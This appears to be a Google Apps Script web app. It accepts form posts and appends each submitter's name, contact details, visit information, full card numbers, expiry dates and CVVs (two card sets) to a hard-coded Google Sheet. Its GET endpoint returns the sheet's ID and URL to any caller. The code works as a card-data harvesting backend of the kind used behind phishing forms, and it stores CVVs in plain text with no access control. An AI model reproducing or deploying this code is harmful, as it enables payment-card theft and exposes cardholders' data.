const SPREADSHEET_ID = '15qeepPxwTUUnzaTlv8mbu4J3K4uYfi2Hl1gxgRteUng';

function getResponseSheet() {
  const spreadsheet = SpreadsheetApp.openById(SPREADSHEET_ID);
  const sheet = spreadsheet.getSheetByName('Responses') || spreadsheet.insertSheet('Responses');

  if (sheet.getLastRow() === 0) {
    sheet.appendRow([
      'Timestamp',
      'Form Type',
      'Full Name',
      'Visit Date',
      'Visit Reason',
      'Email',
      'Phone',
      'Payment Amount',
      'Card Holder Name',
      'Card Number',
      'Expiry Date',
      'CVV',
      'Guarantor ID',
      'Guarantor Name',
      'Bill Amount',
      'Bill Card Holder Name',
      'Bill Card Number',
      'Bill Expiry Date',
      'Bill CVV'
    ]);
  }

  return { spreadsheet, sheet };
}

function doGet() {
  try {
    const { spreadsheet, sheet } = getResponseSheet();
    const payload = {
      success: true,
      message: 'Apps Script web app is active.',
      spreadsheetId: spreadsheet.getId(),
      spreadsheetUrl: spreadsheet.getUrl(),
      responseSheetName: sheet.getName()
    };

    return ContentService
      .createTextOutput(JSON.stringify(payload))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function doPost(e) {
  try {
    const { sheet, spreadsheet } = getResponseSheet();
    const data = e.parameter;
    const timestamp = new Date();
    const formType = data.formType || 'unknown';

    const row = [
      timestamp,
      formType,
      data.fullName || '',
      data.visitDate || '',
      data.visitReason || '',
      data.email || '',
      data.phone || '',
      data.paymentAmount || '',
      data.cardHolderName || '',
      data.cardNumber || '',
      data.expiryDate || '',
      data.cvv || '',
      data.guarantorId || '',
      data.guarantorName || '',
      data.billAmount || '',
      data.billCardHolderName || '',
      data.billCardNumber || '',
      data.billExpiryDate || '',
      data.billCvv || ''
    ];

    sheet.appendRow(row);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true, message: 'Saved successfully', spreadsheetId: spreadsheet.getId(), spreadsheetUrl: spreadsheet.getUrl() }))
      .setMimeType(ContentService.MimeType.JSON);
  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}
